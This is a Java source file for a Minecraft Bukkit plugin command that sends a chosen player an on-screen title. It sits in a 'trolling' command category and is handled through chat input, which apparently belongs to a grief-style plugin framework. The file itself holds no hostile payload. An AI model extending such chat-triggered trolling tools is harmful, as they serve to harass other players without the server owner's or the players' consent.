package de.impact.commands.trolling;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Title extends Command {

    public Title() {
        super("Title", "Title <Player> <Title%nl%Message>", "Send someone a title", CommandCategory.TROLLING);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 2) {
            sendUsage(p);
            return;
        }

        StringBuilder message = new StringBuilder();

        for(int i=1;i<aliases.length;i++)
            message.append(aliases[i]).append(" ");

        Player target = Bukkit.getPlayer(aliases[0]);

        if(target == null) {
            ChatUtils.sendMessage(p, "This player could not be found");
            return;
        }

        try {

            String title = message.toString().split("%nl%")[0];
            String content = message.toString().replaceFirst(title + "%nl%", "");

            target.sendTitle(ChatColor.translateAlternateColorCodes('&', title), ChatColor.translateAlternateColorCodes('&', content));

            ChatUtils.sendMessage(p, "Successfully sent a title to §a" + target.getName());

        } catch(Exception ignored) {
            sendUsage(p);
        }
    }

}
